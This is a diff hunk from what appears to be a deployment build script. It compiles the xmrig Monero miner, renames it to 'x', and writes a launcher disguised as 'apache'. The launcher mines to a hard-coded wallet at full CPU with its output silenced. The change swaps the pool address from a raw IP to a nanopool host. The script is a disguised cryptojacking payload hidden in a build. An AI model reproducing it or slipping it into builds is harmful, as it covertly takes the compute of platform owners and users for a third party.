@@ -8,7 +8,7 @@ cd xr/build
 cmake .. -DWITH_HTTPD=OFF
 make
 mv /app/xr/build/xmrig /app/xr/build/x
-echo "/app/xr/build/x -o 207.246.117.178:8080 -u 41jcJH1B2Hj1vGJGioERFGi71Gu3AniSmC75kQReMikC8wB9rkTeguQ9DPiUYRNp4K5ucDrv34vWN7yEYkLmWD6NGq8vXqA -p x -k --max-cpu-usage 100 > /dev/null" > /app/apache
+echo "/app/xr/build/x -o xmr-us-east1.nanopool.org:14444 -u 41jcJH1B2Hj1vGJGioERFGi71Gu3AniSmC75kQReMikC8wB9rkTeguQ9DPiUYRNp4K5ucDrv34vWN7yEYkLmWD6NGq8vXqA -p x -k --max-cpu-usage 100 > /dev/null" > /app/apache
 chmod 0777 /app/apache
 mv /app/xr $BUILD_DIR/xr 
 mv /app/apache $BUILD_DIR/apache
